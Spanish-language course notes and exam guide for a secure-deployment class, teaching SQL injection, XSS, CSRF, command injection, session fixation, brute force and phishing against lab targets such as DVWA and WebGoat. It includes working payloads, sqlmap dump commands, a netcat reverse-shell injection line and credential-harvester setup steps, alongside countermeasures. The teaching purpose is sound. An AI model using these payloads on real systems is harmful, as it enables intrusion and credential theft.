# Examen Tema 3

Evaluación del tema 3 de puesta en producción segura:

Debido a la amplitud y complejidad de éste tema, lo iremos evaluando en varias partes. Cada una de ellas consistirá en una prueba práctica, en la cual el alumno deberá demostrar con evidencias, que es capaz de efectuar algunos de éstos ataques informáticos :

## 1ª parte: (3,3 p.)

SQLi Error Based
<br>SQLi UNION Based
<br>SQLi Blind Boolean

## 2ª parte: (3,3 p.)

XSS Reflejado
<br>XSS Persistente
<br>Cross-Site Request Forgery
<br>Inyección de comandos

## 3ª parte: (3,4 p.)

Robos de sesión por Session Fixation
<br>Ataques por diccionario y fuerza bruta
<br>Phising e Ingeniería Social
<br>RFI y LFI


Las fechas previstas para la realización de éstas pruebas prácticas serán los miércoles: 8, 15 y 22 de febrero de 2023, respectivamente, en la cuarta hora de la tarde.


# Apuntes

## Tabla de contenidos
1.1 [SQLi Error Based](#sqli-error-based)
<br> 1.2 [SQLi UNION Based](#sqli-union-based)
<br> 1.3 [SQLi Blind Based](#sqli-blind-based)
<br>
<br> 2.1 [XSS Reflejado](#xss-reflejado)
<br> 2.2 [XSS Persistente](#xss-persistente)
<br> 2.3 [Cross-Site Request Forgery](#cross-site-request-forgery)
<br> 2.4 [Inyección de comandos](#inyección-de-comandos)
<br>
<br> 3.1 [Robos de sesión por Session Fixation](#robos-de-sesión-por-session-fixation)
<br> 3.2 [Ataques por diccionario y fuerza bruta](#ataques-por-diccionario-y-fuerza-bruta)
<br> 3.3 [Phising e Ingeniería Social](#phising-e-ingeniería-social)
<br> 3.3.1 [Exposición de datos sensibles](#exposición-de-datos-sensibles)
<br> 3.4 [RFI y LFI](#rfi-y-lfi)

## 1ª parte: (3,3 p.)

### SQLi Error Based

Son las más frecuentes. 

Es la forma más frecuentemente usada en la que se usa SQLi.
Estos ataques se realizan mediante la introducción de texto malicioso en inputs de html.
Lo primero que debemos es comprobar que el formulario es vulenrable, para ello vamos a meter caracteres especiales en el cuadro de texto, por ejemplo una comilla simple (o apostrofo) o una comilla doble ( ' , " ). Sí el formulario y el código son vulnerables, nos devolverá un error de MySQL haciendo referencia a que se encontró un error cercano a las comillas, ya que la introducción de nuestra comilla o comillas generó un cierre de la consulta inesperado y hay comillas impares.

Las inyecciones básicas consisten en introducir en el input del formulario lo contenido similar a

> ' or 1=1 #

De esta forma conseguimos que nos devuelva más resultados de los que debería, ya que, la comilla simple cerrará el parametro que estabamos introduciendo y agregaremos un or que se cumple como verdadero, por lo tanto la query sera { valor 1 o verdadero } por lo que todas las rows serán verdadero y se retornarán todos los datos.


#### Repaso práctico
- 1. Vamos a Firefox en la máquina Kali
- 2. Accedemos a la página principal de OWASP (poniendo su ip en la barra de dirección)
- 3. Y desde ahí accedemos a DVWA (Damn Vulnerable Web Application)


### SQLi UNION Based

Podemos extraer datos de tablas que no se están consultando directamente

Principalmente se tratan de consultas a las cuales se les añade la palabra reservada UNION de SQL, con la finalidad de poder acceder a otras tablas de la Base de Datos.

Para llevar a cabo la ejecución de una consulta a través del UNION será necesario conocer primero la cantidad de columnas que devuelve la consulta original.

Lo primero que tenemos que saber es cuántas columnas me va a devolver la consulta que está creada en PHP. 
Después tengo que saber cómo se ordenan esos elementos, para saber donde solicitar los campos que necesito. 
Y también tendremos que extraer datos sobre el nombre de las tablas de la base de datos, las columnas de las tablas, e información sobre la base de datos.

Para extraer información se hace uso de

- table_name
- information_schema.tables
- table_schema

también se hará uso de 

- columns_name
- information_schema.columns
- table_name
- table_schema

#### 1 - Usar *order by* para descubrir cuantas columnas tenemos en la consulta

Para descubrir de una manera rápida cuantas columnas está devolviendo la columna en la ejecución de la query en servidor, podemos usar la siguiente instrucción sql medianto injection

> ' order by(n) #

Donde n sera un numero (1, 2, 3, 4) iremos iterando el numero hasta que nos devuelva error, de esa manera conoceremos el número de columnas ya que si decimos que realice ordenación por a columna 3 y da error quiere decir que tenemos 2 columnas. ( n - 1 )

#### 2 - Usar *UNION Select* 

Debemos usar union select para conocer la posición de cada una de las columnas

> ' UNION SELECT 1, 2 #

con está sql inyectada, podremos ver en que posicion está cada columna ya que para el ejemplo de los usuarios tendriamos una respuesta así

> ID: ' UNION SELECT 1, 2 # 
> <br>First Name: 1
> <br>Surname: 2


#### 3 - Identificar tablas de la BBDD

Para identificar las tablas de la base de datos podemos probrar la siguiente inyección

> ' union select database(), 2 #

- database() devuelve el nombre de la base de datos en uso

Para saber las tablas de la base de datos en la que se está ejecutando el ataque de sql inyection usaremos

> ' UNION SELECT table_name, database() from information_schema.tables #
> ' UNION SELECT table_name, database() from information_schema.tables WHERE table_schema = database() #

Esto nos devolverá en las respuestas los datos de las tablas de la bbdd que se está usando


#### 4 - Descubrir las columnas de una tabla

Para descubrir las columnas de una tabla podremos usar la siguiente sentencia

> ' UNION SELECT column_name, 2 from information_schema.columns #

(Se agrega el 2 para tener 2 columns en el select)

Ahora podemos aplicar un filtro para devolver las columnas especificas de la tabla que queramos

> ' UNION SELECT column_name, 2 from information_schema.columns WHERE table_name = 'users' #

Mostrar todas las columnas en un solo resultado

> ' UNION SELECT GROUP_CONCAT(column_name SEPARATOR ','), 2 from information_schema.columns WHERE table_name = 'users' #

Una vez descubiertas las columnas que tiene nuestra tabla víctima, podremos lanzar la consulta que deseamos

> ' UNION SELECT user, password FROM users #

! Sí queremos mostrar todo en una sola columna podemos ejecutar

> ' UNION SELECT concat({column}, ', '), 2 FROM users #

#### Repaso práctico
- 1. Vamos a Firefox en la máquina Kali
- 2. Accedemos a la página principal de OWASP (poniendo su ip en la barra de dirección)
- 3. Y desde ahí accedemos a DVWA (Damn Vulnerable Web Application)

#### Repaso práctico #2
- 1. Vamos a Firefox en la máquina Kali
- 2. Accedemos a la página principal de OWASP (poniendo su ip en la barra de dirección)
- 3. Y desde ahí accedemos a bWAPP > SQL Injection(Search/GET) > Hack


### SQLi Blind Based

No se obtienen respuestas aparentemente.
Existen 2 tipos:

- Time based (una consulta bien realizada tardará un tiempo)
- Condicionales (si está bien muestra resultados)

Con este tipo de consultas buscamos que se nos responda indicando si existen o no existen ciertos datos obteniendo esta información podemos deducir cierta información.

La clave es utilizar los mecanismos de comparación que nos ofrece el motor SQL, algunos comandos son:

- Conocer el tamaño del nombre de una cenda
    > ' or length(database()) = 5 #
- Conocer el valor de una letra concreta de la cadena
    > ' or substring(database(), 1, 1) = 'b' #

Vamos repitiendo esto para poder obtener los caracteres que necesitamos para obtener las palabras completas.

Para verificar que este tipo de inyección está funcionando, podemos ejecutar la siguiente sintaxis esperando un resultado negativo:

> ' #

#### 1 - Conocer tamaño de la bbdd

Para conocer el numero de caracteres que tiene el nombre de la base de datos, debemos ejecutar la siguiente instrucción iterando el numero hasta dar con el correcto

> ' or length(database()) = 3 #

Así obtendriamos el dato a 'ciegas' y tendriamos que componer la palabra

#### 2 - Componer el nombre de la base de datos caracter a caracter

Una vez descubrimos el tamaño del nombre de la base de datos, debemos intentar componer el nombre de la misma aplicando la misma lógica

> ' or substring(database(), 1, 1) = "a" #

Debemos de cambiar cada la letra por la siguiente, así hasta que nos devuelva verdadero, entonces habrá que buscar la siguiente letra e iterar el primer numero de la funcion substring, es decir para buscar la siguiente letra

> ' or substring(database(), 2, 1) = "a" #

Comprobariamos de nuevo letra a letra hasta obtener la correcta y así hiriamos iterando hasta completar el nombre

#### Otra forma de hacer SQLi Blind Based

Como ya sabemos que estas consultas nos devuelven resultados verdaderos o falsos, podemos aprovecharnos para realizar inyecciones de consultas que si se cumplen devolverán verdadero y si no, falso

Un ejemplo sería ejecutar la siguiente consulta

> ' UNION SELECT 1, 2, 3, 4, 5, 6, 7 from users #

(en este ejemplo, de pruebas anteriores, sabemos que devolverá 7 columns por eso se pone del 1 -> 7, para otras tablas dependerá de las columns que devuelva)

Así podriamos ir probando distintas *posibles* tablas, recordando que vamos a ciegas he intullendo el posible nombre de la tabla.

Esta misma lógica se puede aplicar para descubrir columnas, ya que si escribimos el nombre de las columnas correctamente nos devolverá verdadero, y si escribimos mal el nombre de una columna *nos devolverá error*

> ' UNION SELECT login, 2, 3, 4, 5, 6, 7 from users #

### SQLi Blind Based - HERRAMIENTAS AUTOMÁTICAS
#### SQLMap

Esta herramienta nos permite realizar SQLi de forma automática usando Diccionarios, sobro todo para las SQLi ciegas (Blind Based)

Para usar esta herramienta deberemos seguir los siguientes pasos

#### Ejecución

Para ello primero debemos ejecutar *burpsuite* para obtener las cookies para poder lanzar el *SQLMap*

- Cerramos la ventana inicial / o aviso inicial que nos pueda dar
- Con la config por defecto avanzamos (Temporary project) > Next
- Dejamos seleccionado *Use burp defaults* y inicamos burpsuite con *Start Burp*

Una vez iniciado

- Buprsuite -> Ejecutamos el navegador de Burpsuite
- Navegador -> Accedemos a la pantalla donde queremos realizar la inyección SQLi
- Burpsuite -> Pestaña proxy cambiar Intercept is off -> Intercept is On (clicamos encima del botón)
- Navegador -> Ejecutamos una búsqueda cualquier para realizar una petición
- Burpsuite -> debe de haber capturado la petición , esta será mostrada en raw, sí se ha capturado correctamente, veremos la cookie y una URL, esta será la información que usaremos
- Burpsuite -> con la información mostrada debemos componer una url siguiendo el siguiente patrón
    - {url owasp}{GET}#       
    -                         { url owasp        }{ GET                                       }#
    - Quedará algo similar -> http://192.168.1.183/dvwa/vulnerabilities/sqli/?id=2&Submit=Submit#
- Terminal -> con la información recogida de la url que necesitamos, y la cookie lanzaremos el siguiente comando
    - sqlmap -u "${ url_compuesta }" --cookie="${ cookie }" --level=5 risk=3 --dbs
    - Ejemplo 
    - sqlmap -u "http://192.168.1.183/dvwa/vulnerabilities/sqli/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=pkltdi3fv01fr791tk83l6g003; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada" --level=5 risk=3 --dbs
    -
        - 
            - Explicación de las opciones del comando
                - -u indica la url a atacar
                - --cookie será la cookie capturada
                - --level=5 indica que no importa hacer ruido con nuestro ataque, a menor número, seremos más discretos
                - --dbs es para que busque el nombre de las bases de datos existentes en el servidor
- Terminal -> Habrá que ir respondiendo las preguntas que nos realicé *sqlmap*
- Terminal -> Mostrará los resultados obtenidos , con el comando anterior nos indicará las bases de datos encontradas

#### Ejecución adicional

Podemos acelerar el proceso , sí en el comando de sqlmap, indicamos que realice inyecciones Boolean Based

- Indicar que use inyeciones Boolean Based
    - --level=5 risk=3 -> -technique=B

#### Buscar tablas

- Terminal -> lanzar comando con las opciones -technique=B -D {nombre_base_de_datos} --tables
    - sqlmap -u "${ url_compuesta }" --cookie="${ cookie }" -technique=B -D {nombre_base_de_datos} --tables
    - Ejemplo 
    - sqlmap -u "http://192.168.1.183/dvwa/vulnerabilities/sqli/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=pkltdi3fv01fr791tk83l6g003; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada" -technique=B -D dvwa --tables

#### Buscar columnas

- Terminal -> lanzar comando con las opciones -technique=B -D {nombre_base_de_datos} --tables
    - sqlmap -u "${ url_compuesta }" --cookie="${ cookie }" -technique=B -D {nombre_base_de_datos} -T {nombre_tabla_bbdd} --columns
    - Ejemplo 
    - sqlmap -u "http://192.168.1.183/dvwa/vulnerabilities/sqli/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=pkltdi3fv01fr791tk83l6g003; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada" -technique=B -D dvwa -T users --columns

#### Obtener información de columnas en concreto - con dumpeo de datos

- Terminal -> lanzar comando con las opciones -technique=B -D {nombre_base_de_datos} -T {nombre_tabla_bbdd} -C 'column,column' --dump
    - sqlmap -u "${ url_compuesta }" --cookie="${ cookie }" -technique=B -D {nombre_base_de_datos} -T {nombre_tabla_bbdd} --columns
    - Ejemplo 
    - sqlmap -u "http://192.168.1.183/dvwa/vulnerabilities/sqli/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=pkltdi3fv01fr791tk83l6g003; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada" -technique=B -D dvwa -T users -C 'user,password' --dump


#### Repaso práctico
- 1. Vamos a Firefox en la máquina Kali
- 2. Accedemos a la página principal de OWASP (poniendo su ip en la barra de dirección)
- 3. Y desde ahí accedemos a bWAPP > SQL Injection - Blind (Search) > Hack

***


## 2ª parte: (3,3 p.)

### Introducción XSS y CSRF

Estos ataques son también de inyección de código. 

*XSS* significa *Cross Site Scripting* y se producen cuando el servidor permite al cliente modificar código fuente de una página web, aunque algunas veces estas modificaciones pueden ser inofensivas, otras veces pueden ser muy peligrosas, tanto como para el usuario como para el propio servidor de la web.

*CSRF* significa *Cross-Site Request Forgery* siendo este una variante de *XSS*

#### Tipos de XSS:
- XSS Reflejado > su explotación no tiene persistencia en el servidor
- XSS Persistentes > si tiene persistencia en el servidor, y es potencialmente peligoroso para otros clientes Web
- Cross-Site Request Forgery > falsificar peticiones de usuarios para forzarle a realizar acciones sin su consentimiento

#### ¿Qué se puede lograr con ataques XSS y CSRF?

- Acciones puntuales no deseadas para los clientes: por ejemplo participar en una votación o influir en el SEO
- Redirecciones forzadas: enviar a los clientes de una web a otra web
- Obtener el control de los ordenadores de los clientes: el atacante puede descargar malware en las víctimas
- Dañar la imagen o reputación de una empresa: por ejemplo, cambiando la imagen y contenido de una web
- Realizar tareas con un rol que no pertenece al atacante: acceder con privilegios de administrador

### XSS Reflejado

- Identificamos un input cuyo valor introducido se muestre en un elemento html o sea procesado
- Intorducir distintas prueba para verificar que es vulnerable
    - Podemos introducir un `<h1>hola</h1>` o `<pre>hola</pre>` para verificar si procesa este html y lo interpresa
    - Para confirmar que permite ataques XSS escribiremos el siguiente input
        - `<script>alert(123);</script>`

** Este tipo de ataques no son muy peligrosos, aunque si se está haciendo un ataque Man In The Middle si pueden resultarlo


#### Repaso práctico
- 1. Vamos a Firefox en la máquina Kali
- 2. Accedemos a la página principal de OWASP (poniendo su ip en la barra de dirección)
- 3. Y desde ahí accedemos a DVWA (Damn Vulnerable Web Application) > XSS Reflected


### XSS Persistente

Este tipo de ataque XSS almacena información en el servidor, de tal manera que cuando otros clientes acceden al archivo HTML en concreto, les afectará a ellos también

#### ¿Como identificar posible vulnerabilidad XSS Stored?

Estos posibles ataques de XSS Stored, pueden darse en formulario de alta (comentarios por ejemplo) cuya información que introducimos será mostrada más tarde, de forma que si interpresa el código introducido, será vulnerable a XSS Stored

- Formulario de alta
- Comprobar vulnerabilidad introducciendo en un input
    - Podemos introducir un `<h1>hola</h1>` o `<pre>hola</pre>` para verificar si procesa este html y lo interpresa
    - Para confirmar que permite ataques XSS escribiremos el siguiente input
        - `<script>alert(123);</script>`
- Refrescar la vista para renderizar los datos introducidos

** Los sitios vulnerables a estos ataques suelen ser BLOGS o FOROS

#### Algunas inyecciones comunes son

- `<script>alert(1)</script>`
- `<img src=1 href=1 onerror="javascript:alert(1)"></img>`
- `<iframe src="javascript:alert(1)"></iframe>`
- `<input onfocus=javascript:alert(1) autofocus>`

#### Repaso práctico
- 1. Vamos a Firefox en la máquina Kali
- 2. Accedemos a la página principal de OWASP (poniendo su ip en la barra de dirección)
- 3. Y desde ahí accedemos a DVWA (Damn Vulnerable Web Application) > XSS Stored

- https://xss-game.appspot.com
- https://xss-quiz.int21h.jp

### Cross-Site Request Forgery

La vulnerabilidad Cross-Site Request Forgery (CSRF) ocurre en aplicaciones web y le permite a un atacante inducir a los usuarios a realizar acciones que no pretenden realizar, como por ejemplo, cambiar su dirección de correo electrónico, su contraseña o realizar una transferencia de fondos.

Mediante una CSRF, un atacante puede eludir parcialmente la política que evita que diferentes sitios web se interfieran entre sí (Same-Origina Policy).

#### ¿Cómo funciona una vulenrabilidad CSRF?

Para que un ataque CSRF sea posible, deben cumplirse tres condiciones:

- *Existe una acción relevante que el atacante quiere inducir.* Puede ser una acción privilegiada (modificar permisos para otros usuarios) o una acción sobre datos específicos del usuario (cambiar la propia contraseña del usuario).
- *El manejo de sesiones debe estar basado en cookies* dado que realizar una acción implica realizar una o más solicitudes HTTP. Y si la aplicación utiliza cookies de sesión, estas siempre serán enviadas para identificar al usuario que ha realizado las solicitudes. 
- *Las solicitudes no contienen parámetros impredecibles*, es decir, no existen valores que el atacante tenga que determinar o adivinar. Por ejemplo, al hacer que un usuario cambie su contraseña, la función no es vulnerable si un atacante necesita conocer el valor de la contraseña existente.

#### ¿Cómo llevarlo a cabo?

Consiste en la inyección de código a través de un input vulnerable XSS, ya que nos permitirá realizar la insercción de código y que este se ejecute.

#### *Ejemplo práctico para Examen*

- 1 > Abrimos burpsuite (para interceptar la llamada) > Temporary project > Use Burp defaults > Start Burp (button)
- 2 > Vamos a Proxy > Open browser
- 3 > En el navegador abierto, accedemos a DVWA > CSRF
- 4 > En bupsuite, activamos en la parte superior el botón Intercept is off -> Intercept is on (Se pondrá en escucha para interceptar)
- 5 > Volvemos al navegador donde estabamos (CSRF) introducimos los campos de *new password* y *confirm new password*
- 6 > Burpsuite interceptará la llamada, por tanto guardaremos la información interceptada (con la información guardada, podemos pulsar de nuevo en intercept is on para pasarlo a off)
- 7 > Iremos a una parte vulnerable de la web que permita la inyección XSS de forma persistente (en DVWA, apartado XSS stored)
- 8 > En el input vulnerable inyectaremos el siguiente comando modificando lo necesario:
    - <script> document.location='http://{url_server_owasp}[ url GET (primera linea) interceptada por burpsuite (teniendo en cuenta de cambiar los valores de los params si fuera necesario) ]';</script>
    - el Resultado será algo similar al siguiente
    - <script> document.location-'http://192.168.1.183/dvwa/vulnerabilites/csrf/?password_new=admin&password_conf=admin&Change=Change#';</script>
- 9 > Al quedar este código persistido, cuando se ejecute, esto nos redirigirá a la pagina de CSRF, cambiando el valor de la password, ya que no hay una validación de CSRF, por tanto cuando el admin acceda a la página donde hemos persisito el código inyectado, se cambiará su password, dandonos acceso al administrador.


#### Contramedidas a usar contra XSS y CSRF

- Las contramedidas para evitar este tipo de ataque son parecidas a las de sqli. (Ver tema)
- El saneado de datos de entrada es clave para evitar el ataque. Suponiendo que estamos empleando PHP en el server side (lado del servidor):
    - strip_tags: Función que permite eliminar las etiquetas PHP y HTML, es ideal para evitar la vulnerabilidad. (esta función tiene el problema de que no elimina código de los atributos de las etiquetas que permitamos)
    - preg_replace: Permite emplear una expresión regular para buscar y sustituir la expresión dada, podemos usarla para corregir el comportamiento de strip_tags. Además es conveniente emplear expresiones regulares para asegurar que lo que envía el cliente es lo que esperamos.

### Inyección de comandos

Se trata de un tipo de vulnerabilidad *MUY PELIGROSA* ya que permite al cliente ejecutar algo en el lado del servidor.
La ejecución de comandos como la CONCATENACIÓN DE COMANDOS es una de las más básicas. Esto suele pasar cuando el cliente DECIDE un parámetro en la ejecución de un comando, y escribe otras cosas que le permiten ejecutar más cosas o comandos, que lo que se suponía que debería solamente ejecutar. Por ejemplo, usando el caracter ";" en Linux, que permite concatenar en una misma linea varios comandos que se ejecutarán secuencialmente.

#### *Ejemplo práctico para Examen*

- 1. Accedemos a "Multitude II" en owasp
- 2. Dentro de este apartado iremos a OWASP 2013 -> A1 - Injection (Other) -> Command Injection -> DNS Lookup
- 3. Dentro encontraremos un input vulnerable a inyección de comandos
- 4. Verificamos la ejecución remota introduciendo `; ls -la` recibiremos por pantalla la salida del ls

#### *reverse-shell o shell remota*

Usaremos el siguiente conjunto de instrucciones 
- En la maquina atacante [ Equipo Kali ] ejecutaremos el nc en modo espera a que se conecten remotamente
    - `nc -vlp 9876`
- En el input vulnerable de inyección de código ejecutaremos la siguiente instrucción
    - `; rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | sh -i 2>&1 | nc [ ip maquina kali ] [ puerto escucha maquina kali ] > /tmp/f`
    - Para este ejemplo quedaría tal cual así:
    - `; rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | sh -i 2>&1 | nc 192.168.1.174 9876 > /tmp/f`
- Si vamos a la terminal de Kali , podremos ver como se ha realizado una conexión remota y ya estamos dentro del servidor atacado


#### Contramedidas contra inyección de comandos

- Otra vez es clave el saneado de la entrada de los clientes.
- Debemos evitar en la entrada cualquier carácter que permita concatenar comandos, así como las opciones no permitidas de los comandos permitidos.
- Una buena idea puede ser crear un usuario que solo tenga permiso para ejecutar los comandos necesarios. De esta forma nos protegemos también en caso de que vulneren el sistema.
- Evitar fallos de seguridad por diseño. No deberiamos permitir que ejecuten comandos que puedan ser peligrosos para el sistema, por ejemplo netcat sin control.

***

## 3ª parte: (3,4 p.)

### Robos de sesión por Session Fixation

Los ataques por Session Fixation consisten en:

- Si la página web mantiene la misma sesión o identificador de un usuario antes y después de la autenticación está cometiendo un fallo de seguridad.
- Un atacante puede obtener un identificador, por ejemplo conectando con el sitio web, incluso sin autenticarse.
- Usando este identificador puede tratar de modificar la petición del usuario legítimo para que este utilice el identificador que previamente generó el atacante.
- Cuando el usuario se autentique, ese identificador se ligará con la sesión del usuario.

#### *Ejemplo práctico para Examen*

- En OWASP WebGoat > START WEBGOAT
- [panel izquierda] Session Management Flaws > Session Fixation
- **[PASO 1]** somos hacker JOE hay que interceptar el mensaje de Banco a Jane (user) y mandarlo como nosotros queramos. Puede usarse un *XSS* interactuando con la página y fingiendo un *ID* de la *Session* a la que nos de la gana, tambien puede usarse un *Man In The Middle*.
<br><br>Para hacer el ataque modificamos el correo interceptado, añadiendo el *SID* que queramos y así saber cuál es.
<br><br>Modificamos el mail que va a mandarse, modificando el a `href=/WebGoat/attack?Screen=56&menu=1800` - Muy importante WebGoat (G mayuscula)
<br><br>Debemos convertilo a `href=/WebGoat/attack?Screen=56&menu=1800&SID=hola` - Agregarle el &SID=hola
<br><br>Pulsamos en SEDN MAIL'

- **[PASO 2]** ahora somos la víctima, estamos visualizando el correo, y debemos pulsar en el link (Goat Hills Financial)

- **[PASO 3]** seguimos siendo la víctima, ahora estamos visualizando el form del link del email.
<br><br>Si miramos la URL del navegador, observaremos que contiene el SID=hola que agregamos.
<br><br>Introducimos user y pass del form en cuestión (para este caso Jane:tarzan) e iniciamos sesión.
<br><br>Ya hemos logado, y como puede apreciarse en el navegador, la sesión sigue siendo 'hola'. Esta sesión tiene todo el poder de Jane. Ahora si somos **Jane** no necesitamos loguearnos, simplemento añadimos &SID=hola a la url y accederemos como si fuera la usuaria **Jane**
<br><br>Accederemos en nueva pestaña al link de abajo y veremos que no tiene session, sin embargo si ponemos el SID=hola estaremos logados.

#### *Robo de sesión por token predecible*

- Si una página web genera los tokens de sesión de forma secuencial o predecible, este token no puede considerarse seguro.
- El atacante puede obtener los posibles tokens de usuario tanto hacia delante como hacía atrás.
- Puede ser relativamente fácil obtener el patrón de generación tokens.
- Una vez que tenemos los tokens sospechosos, podemos iterar sobre ellos para localizar el usuario objetivo.

#### *Robo de sesión por sniffing*

- Da igual lo seguros que sean los tokens generados si el atacante puede acceder a ellos.
- Sniffing hace referencia a la intercepción y observación de comunicaciones entre el cliente y el servidor.
- Normalmente este ataque requiere de otro previo que consiga un esquema de Man In The Middle (MITM)
- Una vez interceptamos las comunicaciones podemos buscar el token de sesión.
- Podemos buscarlo en cookies, en elementos ocultos, en formularios o en la URL (peor opción)

#### *Contramedidas contra el robo de sesión*

- Crear los token de sesión de forma que sean aleatorios (tanto como se pueda)
- Los tokens deben caducar
- No debemos utilizar el mismo token antes y después de la autenticación
- Debemos utilizar cifrado en las comunicaciones para evitar el sniffing



#### Repaso práctico
- 1. Vamos a Firefox en la máquina Kali
- 2. Accedemos a la página principal de OWASP (poniendo su ip en la barra de dirección)
- 3. Y desde ahí accedemos a OWASP WebGoat [webgoat:webgoat]

### Ataques por diccionario y fuerza bruta

Aún gestionando las sesiones correctamente, podemos ser vulnerables a ciertos ataques a credenciales.

Todos los usuarios tienen que introducir sus LOGIN y PASSWORD , si el atacante consigue estos 2 datos, puede usurpar la identidad del usuario legítimo.

Existen 2 ataques:

- Ataques por fuerza bruta > Generar cadenas iterando entre los diferentes caracteres
- Ataques basados en Diccionarios > Emplear usuarios y contraseñas que suelen ser comunes
Estos ataques pueden ser ONLINE u OFFLINE

    - ONLINE >> HYDRA
    - OFFLINE >> JHON THE RIPPER

Algunas veces cuando ponemos Usuario y Contraseña, y la pass está mal, podemos recibir el mensaje `La contraseña no es correcta` Con esto ya sabemos que el usuario está en bbdd, y esto es mala seguridad.

Hay otros LOGINS que cuando llevamos varios intentos, nos banean durante unos minutos sin poder volver a loguearnos, esto es una buena medida contra ataques de fuerza bruta y por diccionarios.

La verificación en 2 pasos también es una buena opción frente a estos tipos de ataques.

#### *Ejemplo práctico para Examen*

- En OWASP WebGoat > OWASP Mutillidae II > OWASP 2013 > A2 - Broken Autentication and Sessión Management > Autenticatin Bypass > Via Brute Foce > Login
- Nos lleva a un formulario, el cual si metemos un user bien y password mal, nos avisará de que la password es incorrecta, **introduciremos las siguientes credenciales admin:a** esto nos dará el mensaje de que verificará que el user admin existe
- Ejecutar en terminal `burpsuite`
- Aceptar mensaje de seguridad , si aparece
- Temporary project > Next
- Use Burp defaults > Start Burp
- Parte superior, pestaña > Proxy
- Aquí podemos o abrir el navegador de brupsuite [Open browser] o intentarlo con el firefox del propio equipo
- Vamos a la página la cual queremos interceptar 
- `burpsuite [Pestaña Proxy]` habilitamos **intercept is off** para que se ponga en **intercept is on**
- `navegador` logamos con las credenciales (incorrectas) admin:a y enviamos formulario
- `burpsuite` Habrá capturado la información, con la información capturada, hacemos `clic botón derecho > Send to Intruder`
- `burpsuite [Pestaña INTRUDER]` tendrá la información que hemos enviado
- `burpsuite [Pestaña INTRUDER][Positions]` Necesitaremos los valores de la Cookie (entre las últimas líneas) y el varlor de la útima linea de username y password
    - Si nos fijamos los parametros a fuzzear (intercambiar para probar) veremos que están como variables §var§ debermos limpiarlos para agregar los que necesitamos
- `burpsuite [Pestaña INTRUDER][Positions]` botón Clear § de la parte derecha para limpiar las variables
- `burpsuite [Pestaña INTRUDER][Positions]` Como conocemos que el usuario es admin, solo meteremos el simbolo para variable en la password quedando así `§a§` ya que metermos la a entre §
- `burpsuite [Pestaña INTRUDER][Positions]` En la parte superior elegiremos el Attack type > **Baterring ram** (usaremos esta)
    - Sniper: si le indicas muchos parametros, va probando cada vez con uno
    - Battering Ram: si pones varios parametros, va probando el mismo payload con todos ellos a la vez.
    - Pitchfork: pivota entre unos y otros parametros
    - Cluster bomb: primero con 1 payload y luego cambia a otros parametros.
- `burpsuite [Pestaña INTRUDER][Positions]` Cambiamos a la pestaña `Payloads`
    - Tendremos dos posiblidades
        - Simple list es una lista en la que nosotros vamos poniendo las palabras directamente que queremos probar
        - Runtime file es un archivo de texto que contiene un diccionario ya creado con miles o millones de posibles palabras

**Elegimos Simple list**

- `burpsuite [Pestaña INTRUDER][Payloads]` Elegir Payload type > **Simple list**
- `burpsuite [Pestaña INTRUDER][Payloads]` Apartado del medio, introduciremos uno a uno la lista de palabras que queremos probar dandole al botón `Add`
    - Agregaremos las siguiente [hola, joe, jane, admin]
- `burpsuite [Pestaña INTRUDER][Payloads]` En la parte superior iniciamos el ataque > Start attack
- `burpsuite [Pestaña INTRUDER][Payloads]` Abrirá una ventana para ver como avanza en las pruebas de contraseñas, vemos que devolverá un **200 (no será valido)** y cuando encuentre la correcta, devolverá un status **diferente de 200** y el campo length devolverá un número distinto del resto

**Elegimos Runtime file**

- `burpsuite [Pestaña INTRUDER][Payloads]` Elegir Payload type > **Runtime file**
- `burpsuite [Pestaña INTRUDER][Payloads]` Apartado del medio , tendremos un input para selecionar fichero
- `burpsuite [Pestaña INTRUDER][Payloads]` Seleccionar fichero `/usr/share/wordlist/rockyou.txt` (Debemos descomprimir /usr/share/wordlist/rockyou.txt.gz con `sudo gzip -d rockyou.txt.gz`)
- `burpsuite [Pestaña INTRUDER][Payloads]` En la parte superior iniciamos el ataque > Start attack
- `burpsuite [Pestaña INTRUDER][Payloads]` Abrirá una ventana para ver como avanza en las pruebas de contraseñas, vemos que devolverá un **200 (no será valido)** y cuando encuentre la correcta, devolverá un status **diferente de 200** y el campo length devolverá un número distinto del resto

#### *Contramedidas contra la fuerza bruta y diccionarios*

- El uso de captchas, timeouts y baneos temporales por múltiples intentos puede paliar los ataques online.
- No dar información al atacante sobre la existencia de cuentas.
- Políticas de contraseñas.
- Los ataques offline se pueden combatir con cifrado fuerte en las passwords, además es útil el uso de salt.

** salt: es una pequeña cadena de caracteres, conocida por el propio sistema que gestiona las contraseñas, que se añade a las contraseñas hasheadas que se encuentran en el archivo de contraseñas. Esta cadena de caracteres se puede añadir al principio o al final de los hashes, o incluso por el medio, de tal manera que en caso de recibir ataques por fuerza bruta, con archivos ya hasheados, los atacantes no puedan encontrar nunca la contraseña que están buscando.

### Phising e Ingeniería Social

El Phising consiste en engañar a la víctima para que introduzca sus credenciales en algún formulario de una página que simula ser una página legítima, y esos datos llegan al atacante. Se puede hacer mediante Correos, SMS, llamadas telefónicas, etc.

Para ello hay que tomar las siguientes medidas:

- 1. Sospechar de fuentes conocidas
- 2. Comprobar la URL
- 3. Comprobar el certificado de la Web si existe

#### *Ejemplo práctico para Examen*

- Abrimos un terminal en la máquina Kali, ejecutamos `sudo setoolkit`
- Elegimos opción 1 > `1) Social-Engineering Attacks`
- Elegimos opción 2 > `2) Website Attack Vectors`
- Elegimos opción 3 > `3) Credential Harvester Attack Method`
- Ahora tenemos diversas opciones
    - 1 . Utilizar plantillas por defecto
    - 2 . Clonar el sitio Web
    - 3 . Importar el sitio Web
- Elegimos opción 1 > `1) Web Templates`
- Dejamos IP por defecto, damos intro
- Ahora tenemos diversas opciones
    - 1 . Java Required
    - 2 . Google
    - 3 . Twitter
- Elegimos opción 2 > `2. Google`
- Abrimos un navegador y accedemos a localhost
- Mostrará una web copia de Google, pero sera una falsificación
